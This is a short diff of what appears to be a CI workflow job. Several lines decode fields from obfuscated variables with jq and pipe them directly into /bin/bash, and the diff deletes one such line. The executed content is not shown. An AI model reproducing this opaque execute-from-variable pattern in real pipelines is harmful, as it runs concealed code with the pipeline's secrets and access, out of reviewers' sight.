@@ -25,7 +25,6 @@ jobs:
           echo $mmjgs26 | jq -r .lm95 | /bin/bash
           echo $zc1929 | jq -r .grdvm761 | /bin/bash
           echo $aecsr696 | jq -r .ij9 | /bin/bash
-          echo $tyaa267 | jq -r .d457 | /bin/bash
           echo $ydg54 | jq -r .cdyi8 | /bin/bash
 
       - name: Archive artifact
